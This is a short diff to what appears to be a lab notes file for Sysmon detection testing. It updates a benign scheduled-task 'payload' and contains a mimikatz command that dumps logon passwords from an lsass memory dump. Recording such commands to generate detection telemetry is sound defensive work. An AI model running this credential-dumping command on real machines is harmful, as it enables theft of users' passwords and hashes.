@@ -7,7 +7,11 @@
 #### note: put Sysmon64.exe and sysmonconfig.xml in C:\Users\\{Username}\Documents
 
 ##### payload record:
-SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST 15:30 /SD 06/01/2024
+##### SCHTASKS (powershell only)
+$time = [DateTime]::Now.AddMinutes(30)
+$hourMinute = $time.ToString("HH:mm")
+SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST $hourMinute
+
 
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 
